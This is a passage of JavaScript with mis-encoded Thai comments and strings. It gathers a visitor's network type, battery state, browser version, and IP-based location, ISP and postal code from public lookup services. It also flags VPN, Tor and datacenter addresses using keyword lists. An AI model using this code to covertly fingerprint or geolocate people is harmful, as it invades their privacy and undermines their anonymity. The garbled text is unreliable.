    downlink: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    rtt: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
    saveData: false,
    isWifi: false,
    isMobile: false,
    networkType: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ"
  };
  
  if (connection) {
    // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô
    connectionInfo.type = connection.type || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ";
    connectionInfo.effectiveType = connection.effectiveType || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ";
    connectionInfo.downlink = connection.downlink || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ";
    connectionInfo.rtt = connection.rtt || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ";
    connectionInfo.saveData = connection.saveData || false;
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏°‡∏≤‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô
    if (connection.type === 'wifi') {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "WiFi";
      
      // ‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß WiFi ‡∏à‡∏≤‡∏Å downlink
      if (connection.downlink) {
        if (connection.downlink >= 10) {
          connectionInfo.networkQuality = "‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏™‡∏π‡∏á";
        } else if (connection.downlink >= 2) {
          connectionInfo.networkQuality = "‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á";
        } else {
          connectionInfo.networkQuality = "‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏ï‡πà‡∏≥";
        }
      }
    }
    else if (connection.type === 'cellular') {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
      
      // ‡∏£‡∏∞‡∏ö‡∏∏‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠‡∏à‡∏≤‡∏Å effectiveType
      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
        connectionInfo.networkType = "2G";
      } else if (connection.effectiveType === '3g') {
        connectionInfo.networkType = "3G";
      } else if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "4G/LTE";
      }
      
      // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å Navigator
      if (/5g/i.test(navigator.userAgent) || connection.type === '5g') {
        connectionInfo.networkType = "5G";
      }
    }
    else if (['ethernet', 'wired'].includes(connection.type)) {
      connectionInfo.networkType = "‡∏™‡∏≤‡∏¢‡πÅ‡∏•‡∏ô (Ethernet)";
    }
    else if (connection.type === 'bluetooth') {
      connectionInfo.networkType = "Bluetooth";
    }
    else if (connection.type === 'wimax') {
      connectionInfo.networkType = "WiMAX";
    }
    else if (connection.type === 'none') {
      connectionInfo.networkType = "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠";
    }
    else if (connection.type === 'unknown') {
      // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å effectiveType ‡∏´‡∏≤‡∏Å‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• type ‡∏ó‡∏µ‡πà‡∏ä‡∏±‡∏î‡πÄ‡∏à‡∏ô
      if (connection.effectiveType === '4g') {
        connectionInfo.networkType = "‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏™‡∏π‡∏á (‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô WiFi)";
        connectionInfo.isWifi = true;
      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
        connectionInfo.networkType = "‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠";
        connectionInfo.isMobile = true;
      } else {
        connectionInfo.networkType = "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡πÑ‡∏î‡πâ";
      }
    }
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÇ‡∏´‡∏°‡∏î Data Saver
    if (connection.saveData) {
      connectionInfo.saveDataMode = "‡πÄ‡∏õ‡∏¥‡∏î‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡πÇ‡∏´‡∏°‡∏î‡∏õ‡∏£‡∏∞‡∏´‡∏¢‡∏±‡∏î‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•";
    }
  } else {
    // ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏°‡∏µ Network Information API ‡πÉ‡∏´‡πâ‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å userAgent
    const userAgent = navigator.userAgent.toLowerCase();
    
    if (/mobile|android|iphone|ipad|ipod|windows phone|iemobile|opera mobi/i.test(userAgent)) {
      connectionInfo.isMobile = true;
      connectionInfo.networkType = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏°‡∏∑‡∏≠‡∏ñ‡∏∑‡∏≠ (‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£)";
    } else {
      connectionInfo.isWifi = true;
      connectionInfo.networkType = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô WiFi/Ethernet (‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì‡∏Å‡∏≤‡∏£)";
    }
  }
  
  return connectionInfo;
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏£‡∏∞‡∏î‡∏±‡∏ö‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà
async function getBatteryInfo() {
  try {
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á Battery API ‡πÑ‡∏î‡πâ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      
      // ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡πÄ‡∏ß‡∏•‡∏≤‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠ (‡∏Å‡∏£‡∏ì‡∏µ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ä‡∏≤‡∏£‡πå‡∏à ‡∏´‡∏£‡∏∑‡∏≠‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô)
      let remainingTime = "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡πÑ‡∏î‡πâ";
      if (battery.charging && battery.chargingTime !== Infinity) {
        // ‡πÅ‡∏õ‡∏•‡∏á‡∏ß‡∏¥‡∏ô‡∏≤‡∏ó‡∏µ‡πÄ‡∏õ‡πá‡∏ô‡∏ä‡∏±‡πà‡∏ß‡πÇ‡∏°‡∏á‡πÅ‡∏•‡∏∞‡∏ô‡∏≤‡∏ó‡∏µ
        const hours = Math.floor(battery.chargingTime / 3600);
        const minutes = Math.floor((battery.chargingTime % 3600) / 60);
        remainingTime = `‡∏≠‡∏µ‡∏Å‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì ${hours}h ${minutes}m ‡∏à‡∏∞‡πÄ‡∏ï‡πá‡∏°`;
      } else if (!battery.charging && battery.dischargingTime !== Infinity) {
        const hours = Math.floor(battery.dischargingTime / 3600);
        const minutes = Math.floor((battery.dischargingTime % 3600) / 60);
        remainingTime = `‡∏≠‡∏µ‡∏Å‡∏õ‡∏£‡∏∞‡∏°‡∏≤‡∏ì ${hours}h ${minutes}m ‡∏à‡∏∞‡∏´‡∏°‡∏î`;
      }
      
      // ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏ñ‡∏≤‡∏ô‡∏∞
      let chargingStatus;
      if (battery.charging) {
        chargingStatus = battery.level >= 0.99 ? "‡∏ä‡∏≤‡∏£‡πå‡∏à‡πÄ‡∏ï‡πá‡∏°‡πÅ‡∏•‡πâ‡∏ß" : "‡∏Å‡∏≥‡∏•‡∏±‡∏á‡∏ä‡∏≤‡∏£‡πå‡∏à";
      } else {
        chargingStatus = "‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ‡∏ä‡∏≤‡∏£‡πå‡∏à";
      }
      
      // ‡∏õ‡∏£‡∏∞‡πÄ‡∏°‡∏¥‡∏ô‡∏™‡∏∏‡∏Ç‡∏†‡∏≤‡∏û‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà (‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏Ñ‡∏£‡πà‡∏≤‡∏ß‡πÜ)
      let batteryHealth = "‡∏õ‡∏Å‡∏ï‡∏¥";
      // ‡∏ö‡∏±‡∏ô‡∏ó‡∏∂‡∏Å‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏° (‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡πÅ‡∏ô‡∏ß‡πÇ‡∏ô‡πâ‡∏°‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô - ‡∏ñ‡πâ‡∏≤‡∏ú‡∏π‡πâ‡πÉ‡∏ä‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô‡∏´‡∏•‡∏≤‡∏¢‡∏Ñ‡∏£‡∏±‡πâ‡∏á)
      try {
        // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏Å‡∏≤‡∏£‡∏ä‡∏≤‡∏£‡πå‡∏à‡πÅ‡∏ö‡∏ï‡πÉ‡∏ô‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå
        const storedBatteryData = localStorage.getItem('batteryData');
        let batteryDataHistory = storedBatteryData ? JSON.parse(storedBatteryData) : [];
        
        // ‡πÄ‡∏Å‡πá‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô
        const currentData = {
          timestamp: Date.now(),
          level: battery.level,
          charging: battery.charging
        };
        batteryDataHistory.push(currentData);
        
        // ‡πÄ‡∏Å‡πá‡∏ö‡πÄ‡∏â‡∏û‡∏≤‡∏∞ 5 ‡∏Ñ‡πà‡∏≤‡∏•‡πà‡∏≤‡∏™‡∏∏‡∏î
        if (batteryDataHistory.length > 5) {
          batteryDataHistory = batteryDataHistory.slice(-5);
        }
        
        localStorage.setItem('batteryData', JSON.stringify(batteryDataHistory));
      } catch (e) {
        // ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡∏µ‡∏¢‡∏ô localStorage ‡πÑ‡∏î‡πâ ‡πÑ‡∏°‡πà‡∏ï‡πâ‡∏≠‡∏á‡∏ó‡∏≥‡∏≠‡∏∞‡πÑ‡∏£
      }
      
      return {
        level: Math.floor(battery.level * 100) + "%",
        charging: chargingStatus,
        remainingTime: remainingTime,
        health: batteryHealth
      };
    }
    
    // ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡∏£‡∏≠‡∏á‡∏£‡∏±‡∏ö Battery API
    return {
      level: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      charging: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ"
    };
  } catch (error) {
    console.error("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÅ‡∏ö‡∏ï‡πÄ‡∏ï‡∏≠‡∏£‡∏µ‡πà:", error);
    return {
      level: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡πÑ‡∏î‡πâ",
      charging: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
      error: error.message
    };
  }
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡πÄ‡∏ö‡∏£‡∏≤‡∏ß‡πå‡πÄ‡∏ã‡∏≠‡∏£‡πå
function detectBrowser() {
  const userAgent = navigator.userAgent;
  let browserName = "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö";
  let browserVersion = "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö";

  if (userAgent.indexOf("Firefox") > -1) {
    browserName = "Firefox";
    browserVersion = userAgent.match(/Firefox\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("SamsungBrowser") > -1) {
    browserName = "Samsung Browser";
    browserVersion = userAgent.match(/SamsungBrowser\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) {
    browserName = "Opera";
    browserVersion = userAgent.indexOf("Opera") > -1 ?
                     userAgent.match(/Opera\/([\d.]+)/)[1] :
                     userAgent.match(/OPR\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Edge") > -1) {
    browserName = "Microsoft Edge";
    browserVersion = userAgent.match(/Edge\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Edg") > -1) {
    browserName = "Microsoft Edge (Chromium)";
    browserVersion = userAgent.match(/Edg\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Chrome") > -1) {
    browserName = "Chrome";
    browserVersion = userAgent.match(/Chrome\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("Safari") > -1) {
    browserName = "Safari";
    browserVersion = userAgent.match(/Version\/([\d.]+)/)[1];
  } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
    browserName = "Internet Explorer";
    browserVersion = userAgent.match(/(?:MSIE |rv:)([\d.]+)/)[1];
  }

  return `${browserName} ${browserVersion}`;
}

// ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP ‡πÇ‡∏î‡∏¢‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î (‡πÉ‡∏ä‡πâ ipinfo.io)
async function getIPDetails() {
  try {
    // ‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ ipinfo.io ‡∏Å‡πà‡∏≠‡∏ô (‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏•‡∏∞‡πÄ‡∏≠‡∏µ‡∏¢‡∏î‡∏Å‡∏ß‡πà‡∏≤)
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      throw new Error(`ipinfo.io request failed with status ${response.status}`);
    }
    const ipDetails = await response.json();
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏ß‡πà‡∏≤‡πÄ‡∏õ‡πá‡∏ô IP ‡∏à‡∏≤‡∏Å VPN, Datacenter, Proxy ‡∏´‡∏£‡∏∑‡∏≠‡πÑ‡∏°‡πà
    let ipType = "residential"; // ‡∏Ñ‡πà‡∏≤‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡∏Ñ‡∏∑‡∏≠ IP ‡∏ö‡πâ‡∏≤‡∏ô‡∏ó‡∏±‡πà‡∏ß‡πÑ‡∏õ
    let ipNotes = "";
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠‡∏≠‡∏á‡∏Ñ‡πå‡∏Å‡∏£ (org) - ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡πá‡∏ô datacenter ‡∏´‡∏£‡∏∑‡∏≠ VPN
    if (ipDetails.org) {
      const org = ipDetails.org.toLowerCase();
      if (org.includes('amazon') || org.includes('aws') || 
          org.includes('digital ocean') || org.includes('linode') ||
          org.includes('microsoft') || org.includes('azure') ||
          org.includes('google') || org.includes('cloud') ||
          org.includes('hosting') || org.includes('data center') ||
          org.includes('datacenter') || org.includes('server')) {
        ipType = "datacenter";
        ipNotes = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÄ‡∏õ‡πá‡∏ô IP ‡∏à‡∏≤‡∏Å datacenter/cloud";
      } else if (org.includes('vpn') || org.includes('nord') || 
                org.includes('express vpn') || org.includes('private') || 
                org.includes('surfshark') || org.includes('proton')) {
        ipType = "vpn";
        ipNotes = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÉ‡∏ä‡πâ VPN";
      } else if (org.includes('tor') || org.includes('exit') || 
                org.includes('relay')) {
        ipType = "tor";
        ipNotes = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡πÉ‡∏ä‡πâ Tor network";
      } else if (org.includes('proxy') || org.includes('cdn') || 
                org.includes('cloudflare')) {
        ipType = "proxy";
        ipNotes = "‡∏ô‡πà‡∏≤‡∏à‡∏∞‡∏ú‡πà‡∏≤‡∏ô Proxy";
      }
    }
    
    // ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠‡πÇ‡∏Æ‡∏™‡∏ï‡πå - ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡πá‡∏ô dynamic IP ‡∏à‡∏≤‡∏Å ISP
    if (ipDetails.hostname) {
      const hostname = ipDetails.hostname.toLowerCase();
      if (hostname.includes('dynamic') || hostname.includes('ppp') ||
          hostname.includes('pool') || hostname.includes('dhcp')) {
        if (ipType === "residential") {
          ipNotes = "IP ‡πÑ‡∏î‡∏ô‡∏≤‡∏°‡∏¥‡∏Å (‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á‡πÑ‡∏î‡πâ)";
        }
      } else if (hostname.includes('static')) {
        if (ipType === "residential") {
          ipNotes = "IP ‡∏Ñ‡∏á‡∏ó‡∏µ‡πà";
        }
      }
    }
    
    // ‡∏à‡∏±‡∏î‡∏£‡∏π‡∏õ‡πÅ‡∏ö‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÉ‡∏´‡πâ‡∏™‡∏≠‡∏î‡∏Ñ‡∏•‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ö‡πÇ‡∏Ñ‡∏£‡∏á‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÄ‡∏î‡∏¥‡∏° + ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°
    return {
      ip: ipDetails.ip || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
      hostname: ipDetails.hostname || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
      city: ipDetails.city || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      region: ipDetails.region || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      country: ipDetails.country || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      countryName: getCountryNameFromCode(ipDetails.country) || ipDetails.country || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      loc: ipDetails.loc || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
      org: ipDetails.org || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      postal: ipDetails.postal || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
      timezone: ipDetails.timezone || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
      ipType: ipType, // ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó‡∏Ç‡∏≠‡∏á IP (residential, datacenter, vpn, proxy, tor)
      ipNotes: ipNotes // ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°
    };
  } catch (error) {
    console.error("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏î‡∏∂‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP ‡∏à‡∏≤‡∏Å ipinfo.io ‡πÑ‡∏î‡πâ:", error);
    
    // ‡∏•‡∏≠‡∏á‡πÉ‡∏ä‡πâ ipapi.co ‡∏´‡∏£‡∏∑‡∏≠ ip-api.com ‡πÄ‡∏õ‡πá‡∏ô fallback
    try {
      const fallbackResponse = await fetch('https://ipapi.co/json/');
      if (!fallbackResponse.ok) throw new Error("Fallback API failed");
      
      const fallbackData = await fallbackResponse.json();
      
      return {
        ip: fallbackData.ip || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
        hostname: "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•", // ipapi.co ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ô‡∏µ‡πâ
        city: fallbackData.city || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        region: fallbackData.region || fallbackData.region_name || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        country: fallbackData.country_code || fallbackData.country || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        countryName: fallbackData.country_name || getCountryNameFromCode(fallbackData.country_code) || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        loc: fallbackData.latitude && fallbackData.longitude ? 
             `${fallbackData.latitude},${fallbackData.longitude}` : "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
        org: fallbackData.org || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        postal: fallbackData.postal || fallbackData.zip || "‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•",
        timezone: fallbackData.timezone || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        asn: fallbackData.asn || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        isp: fallbackData.org || "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
        ipType: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ", // ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏ô‡∏µ‡πâ
        ipNotes: "‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡∏à‡∏≤‡∏Å fallback API"
      };
    } catch (fallbackError) {
      console.error("‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡πÉ‡∏ä‡πâ fallback API:", fallbackError);
      
      // ‡∏ñ‡πâ‡∏≤‡πÉ‡∏ä‡πâ fallback ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ ‡∏à‡∏∞‡πÉ‡∏ä‡πâ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£ API ‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏á‡πà‡∏≤‡∏¢‡∏™‡∏∏‡∏î‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ‡πÑ‡∏î‡πâ IP
      try {
        const basicResponse = await fetch('https://api.ipify.org?format=json');
        const basicData = await basicResponse.json();
        return {
          ip: basicData.ip || "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
          country: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
          countryName: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
          city: "‡πÑ‡∏°‡πà‡∏ó‡∏£‡∏≤‡∏ö",
          ipType: "‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏£‡∏∞‡∏ö‡∏∏‡πÑ‡∏î‡πâ",
          ipNotes: "‡∏°‡∏µ‡πÄ‡∏û‡∏µ‡∏¢‡∏á‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏• IP ‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô"
        };
      } catch (basicError) {
